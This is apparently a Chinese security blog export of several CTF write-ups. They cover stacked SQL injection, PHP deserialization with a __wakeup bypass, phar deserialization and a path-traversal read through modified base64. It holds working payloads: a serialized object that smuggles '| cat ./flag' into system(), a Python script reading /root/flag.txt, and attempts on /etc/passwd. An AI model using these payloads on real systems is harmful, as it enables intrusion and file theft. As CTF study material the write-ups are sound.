//var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;])); if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]))&#123; //echo $post[&apos;query&apos;]; die(&quot;Nonono.&quot;); &#125; if(strlen($post[&apos;query&apos;])&gt;40)&#123; die(&quot;Too long.&quot;); &#125; $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;; mysqli_multi_query($MysqlLink,$sql); do&#123; if($res = mysqli_store_result($MysqlLink))&#123; while($row = mysqli_fetch_row($res))&#123; print_r($row); &#125; &#125; &#125;while(@mysqli_next_result($MysqlLink)); &#125; ?&gt; 然后主要源码 12345if(strlen($post[&apos;query&apos;])&gt;40)&#123; die(&quot;Too long.&quot;);&#125;$sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;mysqli_multi_query($MysqlLink,$sql); 看样子应该是堆叠了，但是一直不知道 || 应该怎么用 首先设置sqlmode模式为pipesas_concat，然后来拼接语句 在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能 select 1;set sql_mode=pipes_as_concat;select 1||flag from flag 所以本题的paylaod是 11;set sql_mode=pipes_as_concat;select 1 然后当时力哥fuzz出一个 12&gt; *,1&gt; 也能getflag =========================================================== Upload labs 2index.php 12345678910111213141516171819202122232425262728293031323334#index.php&lt;?phpinclude &apos;class.php&apos;;$userdir = &quot;upload/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);if (!file_exists($userdir)) &#123; mkdir($userdir, 0777, true);&#125;if (isset($_POST[&quot;upload&quot;])) &#123; // 允许上传的图片后缀 $allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;); $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $file_name = $_FILES[&quot;file&quot;][&quot;name&quot;]; $temp = explode(&quot;.&quot;, $file_name); $extension = end($temp); if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;)) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800) // 小于 200 kb &amp;&amp; in_array($extension, $allowedExts) ) &#123; $c = new Check($tmp_name); $c-&gt;check(); if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123; echo &quot;错误：: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;; die(); &#125; else &#123; move_uploaded_file($tmp_name, $userdir . &quot;/&quot; . md5($file_name) . &quot;.&quot; . $extension); echo &quot;文件存储在: &quot; . $userdir . &quot;/&quot; . md5($file_name) . &quot;.&quot; . $extension; &#125; &#125; else &#123; echo &quot;非法的文件格式&quot;; &#125; &#125; func.php接受url参数，去上传目录找上传的文件，获取MIME返回 1234567891011# func.phpif (isset($_POST[&quot;submit&quot;]) &amp;&amp; isset($_POST[&quot;url&quot;])) &#123; if(preg_match(&apos;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\\\s)*|(.|\\\\s)*(file|data|\\.\\.)(.|\\\\s)*/i&apos;,$_POST[&apos;url&apos;]))&#123; die(&quot;Go away!&quot;); &#125;else&#123; $file_path = $_POST[&apos;url&apos;]; $file = new File($file_path); $file-&gt;getMIME(); echo &quot;&lt;p&gt;Your file type is &apos;$file&apos; &lt;/p&gt;&quot;; &#125;&#125; class.php这里的File的__wakeup函数很异常，预计就是题目考点了，作用是创建一个类的新实例，给出的参数将传递到类的构造函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#class.php&lt;?phpinclude &apos;config.php&apos;;class File&#123; public $file_name; public $type; public $func = &quot;Check&quot;; function __construct($file_name)&#123; $this-&gt;file_name = $file_name; &#125; function __wakeup()&#123; $class = new ReflectionClass($this-&gt;func); $a = $class-&gt;newInstanceArgs($this-&gt;file_name); $a-&gt;check(); &#125; function getMIME()&#123; $finfo = finfo_open(FILEINFO_MIME_TYPE); $this-&gt;type = finfo_file($finfo, $this-&gt;file_name); finfo_close($finfo); &#125; function __toString()&#123; return $this-&gt;type; &#125;&#125;class Check&#123; public $file_name; function __construct($file_name)&#123; $this-&gt;file_name = $file_name; &#125; function check()&#123; $data = file_get_contents($this-&gt;file_name); if (mb_strpos($data, &quot;&lt;?&quot;) !== FALSE) &#123; die(&quot;&amp;lt;? in contents!&quot;); &#125; &#125;&#125; 接下来这个admin.php，需要一个ssrf然后，之后会触发getflag函数把flag发到你服务器上 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#admin.php&lt;?phpinclude &apos;config.php&apos;;class Ad&#123; public $ip; public $port; public $clazz; public $func1; public $func2; public $func3; public $instance; public $arg1; public $arg2; public $arg3; function __construct($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)&#123; $this-&gt;ip = $ip; $this-&gt;port = $port; $this-&gt;clazz = $clazz; $this-&gt;func1 = $func1; $this-&gt;func2 = $func2; $this-&gt;func3 = $func3; $this-&gt;arg1 = $arg1; $this-&gt;arg2 = $arg2; $this-&gt;arg3 = $arg3; &#125; function check()&#123; $reflect = new ReflectionClass($this-&gt;clazz); $this-&gt;instance = $reflect-&gt;newInstanceArgs(); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func1); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func2); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func3); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3); &#125; function __destruct()&#123; getFlag($this-&gt;ip, $this-&gt;port); //使用你自己的服务器监听一个确保可以收到消息的端口来获取flag &#125;&#125;if($_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;127.0.0.1&apos;)&#123; if(isset($_POST[&apos;admin&apos;]))&#123; $ip = $_POST[&apos;ip&apos;]; //你用来获取flag的服务器ip $port = $_POST[&apos;port&apos;]; //你用来获取flag的服务器端口 $clazz = $_POST[&apos;clazz&apos;]; $func1 = $_POST[&apos;func1&apos;]; $func2 = $_POST[&apos;func2&apos;]; $func3 = $_POST[&apos;func3&apos;]; $arg1 = $_POST[&apos;arg1&apos;]; $arg2 = $_POST[&apos;arg2&apos;]; $arg2 = $_POST[&apos;arg3&apos;]; $admin = new Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3); $admin-&gt;check(); &#125;&#125;else &#123; echo &quot;You r not admin!&quot;;&#125; 这题利用phar反序列化，思路大概懂了（就是还不会😏） 参考链接：https://mp.weixin.qq.com/s/GGnumPklkUNMLZKQL4NbKg https://www.codercto.com/a/92645.html https://www.cnblogs.com/wfzWebSecuity/p/11207145.html?tdsourcetag=s_pctim_aiomsg https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/ http://www.vuln.cn/6001?tdsourcetag=s_pctim_aiomsg https://xz.aliyun.com/t/6042?tdsourcetag=s_pctim_aiomsg https://mp.weixin.qq.com/s/fDz_i3MkwdMzktJGVGn89g https://blog.csdn.net/lixora/article/details/60572357","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://yoursite.com/tags/wp/"}]},{"title":"几道php反序列化的题","slug":"几道php反序列化的题","date":"2019-08-16T23:09:59.000Z","updated":"2019-08-22T13:47:37.149Z","comments":true,"path":"2019/08/17/几道php反序列化的题/","link":"","permalink":"http://yoursite.com/2019/08/17/几道php反序列化的题/","excerpt":"php反序列化是web中常见的题，值得好好整理一下(。・∀・)ノ，下面记录几道之前做过的题 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"php反序列化是web中常见的题，值得好好整理一下(。・∀・)ノ，下面记录几道之前做过的题 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; MOCTF-PUBGindex.php 12345678910111213141516171819202122232425262728293031&lt;?php error_reporting(0); include &apos;class.php&apos;; if(is_array($_GET)&amp;&amp;count($_GET)&gt;0) &#123; if(isset($_GET[&quot;LandIn&quot;])) &#123; $pos=$_GET[&quot;LandIn&quot;]; &#125; if($pos===&quot;airport&quot;) &#123; die(&quot;&lt;center&gt;»ú³¡´óÏÉÌ«¶à,Äã±»´òËÀÁË~&lt;/center&gt;&quot;); &#125; elseif($pos===&quot;school&quot;) &#123; echo(&apos;&lt;/br&gt;&lt;center&gt;&lt;a href=&quot;/index.html&quot; style=&quot;color:white&quot;&gt;½ÐÎÒÐ£°Ô~~&lt;/a&gt;&lt;/center&gt;&apos;); $pubg=$_GET[&apos;pubg&apos;]; $p = unserialize($pubg); // $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag); &#125; elseif($pos===&quot;AFK&quot;) &#123; die(&quot;&lt;center&gt;ÓÉÓÚÄã³¤Ê±¼äÃ»¶¯,µôµ½º£ÀïÑÍËÀÁË~&lt;/center&quot;); &#125; else &#123; die(&quot;&lt;center&gt;You Lose&lt;/center&gt;&quot;); &#125; &#125;?&gt; class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php include &apos;waf.php&apos;; class sheldon&#123; public $bag=&quot;nothing&quot;; public $weapon=&quot;M24&quot;; // public function __toString()&#123; // $this-&gt;str=&quot;You got the airdrop&quot;; // return $this-&gt;str; // &#125; public function __wakeup() &#123; $this-&gt;bag=&quot;nothing&quot;; $this-&gt;weapon=&quot;kar98K&quot;; &#125; public function Get_air_drops($b) &#123; $this-&gt;$b(); &#125; public function __call($method,$parameters) &#123; $file = explode(&quot;.&quot;,$method); echo $file[0]; if(file_exists(&quot;.//class$file[0].php&quot;)) &#123; system(&quot;php .//class//$method.php&quot;); &#125; else &#123; system(&quot;php .//class//win.php&quot;); &#125; die(); &#125; public function nothing() &#123; die(&quot;&lt;center&gt;You lose&lt;/center&gt;&quot;); &#125; public function __destruct() &#123; waf($this-&gt;bag); if($this-&gt;weapon===&apos;AWM&apos;) &#123; $this-&gt;Get_air_drops($this-&gt;bag); &#125; else &#123; die(&apos;&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;&apos;); &#125; &#125; &#125; // $a = new sheldon(); // $a -&gt;bag=&quot;//win.php| cat ./class/flag&quot;; // $a-&gt;weapon = &quot;AWM&quot;; // echo serialize($a);?&gt; 开始观察，class.php中存在 1234567891011public function __call($method,$parameters)&#123; $file = explode(&quot;.&quot;,$method); echo $file[0]; if(file_exists(&quot;.//class$file[0].php&quot;))&#123; system(&quot;php .//class//$method.php&quot;); &#125; else&#123; system(&quot;php .//class//win.php&quot;); &#125; die();&#125; 当你调用的方法不存在的时候，会解释器会调用__call方法 =&gt; 123public function Get_air_drops($b)&#123; $this-&gt;$b();&#125; =&gt; 123456789public function __destruct()&#123; waf($this-&gt;bag); if($this-&gt;weapon===&apos;AWM&apos;)&#123; $this-&gt;Get_air_drops($this-&gt;bag); &#125; else&#123; die(&apos;&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;&apos;); &#125;&#125; =&gt; 12345elseif($pos===&quot;school&quot;)&#123; $pubg=$_GET[&apos;pubg&apos;]; $p = unserialize($pubg); // $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag);&#125; 这是逆着推的顺序，构造的时候顺着来就行 需要武器为AWM，需要绕过_wakeup()，CVE-2016-7124 √ $this-&gt;bag为Get_air_drops()中的$this-&gt;b，为__call()中的$method ok,最后绕过下面即可 123456789&gt; $file = explode(&quot;.&quot;,$method);&gt; echo $file[0];&gt; if(file_exists(&quot;.//class$file[0].php&quot;))&#123;&gt; system(&quot;php .//class//$method.php&quot;);&gt; &#125;&gt; else&#123;&gt; system(&quot;php .//class//win.php&quot;);&gt; &#125;&gt; 根据else可以构造 $method=//win.php | cat ./flag ==&gt; system(“php .//class//win.php | cat ./flag.php”); payload: 1234$a = new sheldon();$a-&gt;weapon=&quot;AWM&quot;$a-&gt;bag=&quot;//win.php | cat ./class/flag&quot;echo serialize($a); 得到 1O:7:&quot;sheldon&quot;:3:&#123;s:2:&quot;bag&quot;;s:22:&quot;//win.php | cat ./flag&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125; 绕过wakeup 1O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:22:&quot;//win.php | cat ./flag&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125; payload： ?LandIn=school&amp;pubg=O:7:”sheldon”:3:{s:3:”bag”;s:22:”//win.php | cat ./flag”;s:6:”weapon”;s:3:”AWM”;} 有个小坑，flag在源代码中。 ========================================================================== ctf论剑场index.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?class Time&#123; public $flag = &quot;flag&#123;hahahha&#125;&quot;; public $truepassword = &quot;dasdasdsad&quot;; public $time; public $password ; public function __construct($tt, $pp) &#123; $this-&gt;time = $tt; $this-&gt;password = $pp; &#125; function __destruct()&#123; if(!empty($this-&gt;password)) &#123; if(strcmp($this-&gt;password,$this-&gt;truepassword)==0)&#123; echo &quot;&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;&quot;; if(!empty($this-&gt;time))&#123; if(!is_numeric($this-&gt;time))&#123; echo &apos;Sorry.&lt;br&gt;&apos;; show_source(__FILE__); &#125; else if($this-&gt;time &lt; 11 * 22 * 33 * 44 * 55 * 66)&#123; echo &apos;you need a bigger time.&lt;br&gt;&apos;; &#125; else if($this-&gt;time &gt; 66 * 55 * 44 * 33 * 23 * 11)&#123; echo &apos;you need a smaller time.&lt;br&gt;&apos;; &#125; else&#123; sleep((int)$this-&gt;time); var_dump($this-&gt;flag); &#125; echo &apos;&lt;hr&gt;&apos;; &#125; else&#123; echo &apos;&lt;h1&gt;you have no time!!!!!&lt;/h1&gt;&lt;br&gt;&apos;; &#125; &#125; else&#123; echo &apos;&lt;h1&gt;Password is wrong............&lt;/h1&gt;&lt;br&gt;&apos;; &#125; &#125; else&#123; echo &quot;&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&quot;; &#125; &#125; function __wakeup()&#123; $this-&gt;password = 1; echo &apos;hello hacker,I have changed your password and time, rua!&apos;; &#125; &#125; if(isset($_GET[&apos;rua&apos;]))&#123; $rua = $_GET[&apos;rua&apos;]; @unserialize($rua); &#125; else&#123; echo &quot;&lt;h1&gt;Please don&apos;t stop rua 233333&lt;/h1&gt;&lt;br&gt;&quot;; &#125; 这题其实算是代码审计，没有构造pop链啥的 1、绕过wakeup的执行(CVE-2016-7124):当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行，修改对象属性个数。 12&gt;strcmp($this-&gt;password,$this-&gt;truepassword)==0&gt; 2、绕过strcmp: Php5.3之后版本使用strcmp比较一个字符串和数组的话,将不再返回-1而是返回0，构造password数组 11 * 22 * 33 * 44 * 55 * 66=1275523920 66 * 55 * 44 * 33 * 23 * 11=1333502280 3、绕过sleep(): (1)使用16进制表示 0x开头，强制类型转化时会转化为 0； (2)使用科学计数法绕过 1.3E9 所以可以构造 12$a = new Time(&apos;0x4d7c6d00&apos;,[1,2]);echo serialize($a).&quot;\\n&quot;; php5.4.45下完全可以 php7.3.4 原来是wakeup()漏洞影响版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10&gt; 当对象标称成员个数多于实际成员个数时，会跳过wakeup()方法，但是任然会执行__destruct()方法。 ========================================================================== DDCTF- ========================================================================== Xman排位赛-1123&lt;?php include &quot;hello.php&quot;; include(unserialize($_GET[pass])); 123456789101112131415161718192021222324252627&lt;?php class Hello &#123; //file:///var/www/html/index.php //http://59.110.164.44 -o a.php //file:///etc/hosts //file:///var/log/ protected $a=&quot;file:///fla%67&quot;; function test() &#123; $b = strpos($this-&gt;a, &apos;flag&apos;); if($b) &#123; die(&quot;Bye!&quot;); &#125; $c = curl_init(); curl_setopt($c, CURLOPT_URL, $this-&gt;a); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5); echo curl_exec($c); &#125; function __destruct()&#123; $this-&gt;test(); &#125;&#125; $s = new Hello(); echo urlencode(serialize($s));?&gt; 简单的url二次编码绕过","categories":[],"tags":[{"name":"php反序列化","slug":"php反序列化","permalink":"http://yoursite.com/tags/php反序列化/"},{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"2019网络与安全信息专项赛 web3-4","slug":"2019网络与安全信息专项赛-web3-4","date":"2019-08-16T09:41:39.000Z","updated":"2019-08-22T13:47:49.629Z","comments":true,"path":"2019/08/16/2019网络与安全信息专项赛-web3-4/","link":"","permalink":"http://yoursite.com/2019/08/16/2019网络与安全信息专项赛-web3-4/","excerpt":"昨天跟着表哥以及福建农大的大佬们一起做了这个比赛，总体来说题目难度差距有点大，web1、2过于简单，web3、4有点难，主要还是自己太菜了，下面记录下web3、4 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"昨天跟着表哥以及福建农大的大佬们一起做了这个比赛，总体来说题目难度差距有点大，web1、2过于简单，web3、4有点难，主要还是自己太菜了，下面记录下web3、4 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; web2 本来是不写web2的，再看了ChaMd5安全团队的wp后，有个小trick 他们用xxe尝试读取/proc/self/fd/2 由此引发了对/proc/self家族的学习 123456789&gt; /cmdline&gt; 该文件保存了进程的完整命令行&gt; /cwd&gt; 一个符号连接, 指向进程当前的工作目录&gt; /environ&gt; 该文件保存进程的环境变量, 各项之间以空字符分隔, 结尾也可能是一个空字符. 因此, 如果要输出进程 1 的环境变量&gt; /fd&gt; 进 程所打开的每个文件都有一个符号连接在该子目录里, 以文件描述符命名, 这个名字实际上是指向真正的文件的符号连接&gt; web3-show_me_your_image点开是一个文件上传的页面，简单尝试后发现事情并不简单，没有给出上传后的路径，后缀名可能是白名单检测，回到首页，存在一个 1&lt;img src=&quot;img.php?name=lZhRjmj%3D&quot;&gt; 但base64解码错误 继续尝试，抓包发现上传文件时存在set-cookie 1Set-Cookie: session=eyJmaWxlIjp7IiBiIjoiYkZwb1VtcHRhajA9In19.XVbnjA.EUBuniVR7NHnzkqINYGRdetAix0; 12345eyJmaWxlIjp7IiBiIjoiYkZwb1VtcHRhajA9In19==&gt; base64解码bFpoUmptaj0===&gt; base64解码lZhRjmj= 猜测是base64变形 可以半手撸，大佬们都是纯手撸，tql 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python# -*- coding: utf-8 -*-# @Time : 2019/8/16 19:07# @Author : glotozz# @File : testbase64_table = [&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;,&apos;E&apos;,&apos;F&apos;,&apos;G&apos;,&apos;H&apos;,&apos;I&apos;,&apos;J&apos;,&apos;K&apos;,&apos;L&apos;,&apos;M&apos;,&apos;N&apos;,&apos;O&apos;,&apos;P&apos;,&apos;Q&apos;,&apos;R&apos;,&apos;S&apos;,&apos;T&apos;,&apos;U&apos;,&apos;V&apos;,&apos;W&apos;,&apos;X&apos;,&apos;Y&apos;,&apos;Z&apos;, &apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;,&apos;j&apos;,&apos;k&apos;,&apos;l&apos;,&apos;m&apos;,&apos;n&apos;,&apos;o&apos;,&apos;p&apos;,&apos;q&apos;,&apos;r&apos;,&apos;s&apos;,&apos;t&apos;,&apos;u&apos;,&apos;v&apos;,&apos;w&apos;,&apos;x&apos;,&apos;y&apos;,&apos;z&apos;, &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;, &apos;+&apos;, &apos;/&apos;,&apos;=&apos;]base64_table2 = [0 for i in range(66)]def encode_b64(s): l = len(s) i = 0 result = &apos;&apos; while i &lt; l: # 将字符转换为二进制编码，然后对齐 s1 = s[i] b1 = bin(ord(s1))[2:] cb1 = b1.rjust(8, &apos;0&apos;) i += 1 if i &gt;= l: cb2 = &apos;00000000&apos; else: s2 = s[i] b2 = bin(ord(s2))[2:] cb2 = b2.rjust(8, &apos;0&apos;) i += 1 if i &gt;= l: cb3 = &apos;00000000&apos; else: s3 = s[i] b3 = bin(ord(s3))[2:] cb3 = b3.rjust(8, &apos;0&apos;) # 将三字节转换为四字节 cb = cb1 + cb2 + cb3 rb1 = cb[:6] rb2 = cb[6:12] rb3 = cb[12:18] rb4 = cb[18:] # 转换后的编码转为十进制备用 ri1 = int(rb1, 2) ri2 = int(rb2, 2) ri3 = int(rb3, 2) ri4 = int(rb4, 2) # 处理末尾为０的情况，以＇＝＇填充 if i - 1 &gt;= l and ri3 == 0: ri3 = -1 if i &gt;= l and ri4 == 0: ri4 = -1 result += base64_table[ri1] + base64_table[ri2] + base64_table[ri3] + base64_table[ri4] i += 1 return resulta = &quot;1.jpg&quot;t1 = encode_b64(a)t2 = &quot;lZhRjmj=&quot;#只要使t2将65个字符都出现一遍即可，for i in range(len(t1)): base64_table2[base64_table.index(t1[i])] = t2[i]print base64_table2 刚刚打算开始撸表，环境关闭了。。。😭 只能用韩大佬手撸的表 123base64_table = [&apos;/&apos;,&apos;d&apos;, &apos;3&apos;, &apos;y&apos;, &apos;i&apos;,&apos;N&apos;,&apos;m&apos;,&apos;o&apos;,&apos;7&apos;,&apos;C&apos;,&apos;a&apos;,&apos;l&apos;,&apos;D&apos;,&apos;w&apos;,&apos;2&apos;,&apos;q&apos;,&apos;W&apos;,&apos;Z&apos;,&apos;5&apos;,&apos;J&apos;,&apos;P&apos;,&apos;Y&apos;,&apos;L&apos;,&apos;0&apos;,&apos;M&apos;,&apos;T&apos;,&apos;A&apos;, &apos;j&apos;, &apos;S&apos;, &apos;6&apos;, &apos;e&apos;,&apos;f&apos;,&apos;x&apos;,&apos;k&apos;,&apos;9&apos;,&apos;V&apos;,&apos;X&apos;,&apos;g&apos;,&apos;v&apos;,&apos;s&apos;,&apos;R&apos;,&apos;u&apos;,&apos;F&apos;,&apos;+&apos;,&apos;8&apos;,&apos;p&apos;,&apos;H&apos;,&apos;4&apos;,&apos;B&apos;,&apos;1&apos;,&apos;r&apos;,&apos;O&apos;,&apos;U&apos;,&apos;b&apos;, &apos;h&apos;, &apos;K&apos;, &apos;t&apos;, &apos;n&apos;,&apos;=&apos;] 但是我又发现他的表不完整，只能匹配上他自己的表。。 123old_base64_table = [&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;,&apos;E&apos;,&apos;F&apos;,&apos;G&apos;,&apos;H&apos;,&apos;I&apos;,&apos;J&apos;,&apos;L&apos;,&apos;M&apos;,&apos;N&apos;,&apos;O&apos;,&apos;P&apos;,&apos;Q&apos;,&apos;R&apos;,&apos;S&apos;,&apos;T&apos;,&apos;U&apos;,&apos;V&apos;,&apos;W&apos;,&apos;X&apos;,&apos;Y&apos;,&apos;Z&apos;, &apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;,&apos;e&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;,&apos;j&apos;,&apos;k&apos;,&apos;l&apos;,&apos;m&apos;,&apos;n&apos;,&apos;o&apos;,&apos;p&apos;,&apos;q&apos;,&apos;s&apos;,&apos;t&apos;,&apos;u&apos;,&apos;v&apos;,&apos;w&apos;,&apos;x&apos;,&apos;y&apos;,&apos;z&apos;, &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;8&apos;,&apos;9&apos;,&apos;=&apos;] 比如访问../../etc/passwd 123456a = &quot;/etc/passwd&quot;res = &quot;&quot;t1 = encode_b64(a)for i in range(len(t1)): res += base64_table2[base64_table.index(t1[i])]print res 但是有个路径/proc/self/cwd代表指向网站服务的根目录，但是用../../proc/self/cwd/index.php去读取index.php，也失败了 就猜测是不是flask网站 尝试读取/proc/self/cwd/app.py，读取到了源代码： 之后包含提示文件即可 主要是3点，base64变形，/proc/self/cwd执行根目录，flask架构（app.py) 再说句题外话，最后给的提示是flag再/root/flag.txt中 可以整理一个字典，把可疑路径都加进去 123456789101112&gt; /root/flag.txt&gt; /root/flag&gt; &gt; /flag.txt&gt; /flag&gt; &gt; /etc/flag.txt&gt; /etc/flag&gt; &gt; /proc/self/cwd/flag.txt&gt; /proc/self/cwd/flag&gt; 刚刚星盟安全给出了wp base64 编码表是改过的，我们不需要把编码表跑出来，直接构造文件名，让它帮我们编码。 但是只允许 图片文件扩展名 ，所以必须是 图片文件扩展名 结尾。 这里可以利用 base64 每 3字节 编码得到 4字节 的分组特性，不含 扩展名部分 的文件路径用 / 斜杠符填充至能被 3 整除，让最后 扩展名部分 始终落在一个分组的开头，使得每次编码结果相等，我们就可以直接丢弃了。 1234567891011121314151617181920#coding=utf-8 import requestsimport urllibfrom base64 import * url=&apos;http://4d94492ab4fc4d0199f60b1f39d343e5805934980516472c.changame.ichunqiu.com/&apos; path=&apos;../..///root/flag.txt&apos;files=&#123;&apos;file&apos;:(path+&apos;...png&apos;,&apos;a&apos;)&#125;r=requests.post(url+&apos;upload.php&apos;,files=files)try: name=r.text.split(&apos;img.php?name=&apos;)[1].split(&apos;&quot;&apos;)[0]except: name=r.textname=urllib.unquote(name)[:-8]#print namer=requests.get(url+&apos;img.php?name=&apos;+urllib.quote(name))print r.text ========================================================================== web4-按F注入 web4到最后还是零解 hint:不是所有sql都叫PostgreSQL hint2: dns 等网上出现wp了再记录下 参考链接：http://url.cn/55mnocA","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://yoursite.com/tags/wp/"}]},{"title":"几道代码审计题","slug":"几道代码审计题","date":"2019-08-16T04:25:40.000Z","updated":"2019-08-22T13:47:42.968Z","comments":true,"path":"2019/08/16/几道代码审计题/","link":"","permalink":"http://yoursite.com/2019/08/16/几道代码审计题/","excerpt":"代码审计 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"代码审计 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; HackingLab脚本关二12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php header(&quot;Content-type: text/html; charset=utf-8&quot;); if (isset($_GET[&apos;view-source&apos;])) &#123; show_source(__FILE__); exit(); &#125; include(&apos;flag.php&apos;); $smile = 1; if (!isset ($_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/\\./&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/%/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/[0-9]/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/http/&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0; if (preg_match (&apos;/https/&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0; if (preg_match (&apos;/ftp/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/telnet/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/_/&apos;, $_SERVER[&apos;QUERY_STRING&apos;])) $smile = 0; if ($smile) &#123; if (@file_exists ($_GET[&apos;^_^&apos;])) $smile = 0; &#125; if ($smile) &#123; $smile = @file_get_contents ($_GET[&apos;^_^&apos;]); if ($smile === &quot;(●&apos;◡&apos;●)&quot;) die($flag); &#125; ?&gt; &lt;!doctype html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; &lt;title&gt;Show me your smile :)&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;div class=&quot;loginform cf&quot;&gt; &lt;form name=&quot;login&quot; action=&quot;index.php&quot; method=&quot;POST&quot; accept-charset=&quot;utf-8&quot;&gt; &lt;ul&gt; &lt;li&gt; &lt;label for=&quot;SMILE&quot;&gt;请使用微笑过关&lt;a href=&quot;?view-source&quot;&gt;源代码&lt;/a&gt;&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;T_T&quot; placeholder=&quot;where is your smile&quot; required&gt; &lt;/li&gt; &lt;li&gt;&lt;input type=&quot;submit&quot; value=&quot;Show&quot;&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/form&gt; &lt;/div&gt; &lt;div style=&quot;text-align:center;clear:both&quot;&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; file_get_contents()，可以用的协议有 file:// — 访问本地文件系统 http:// — 访问 HTTP(s) 网址 ftp:// — 访问 FTP(s) URLs php:// — 访问各个输入/输出流（I/O streams） zlib:// — 压缩流 data:// — 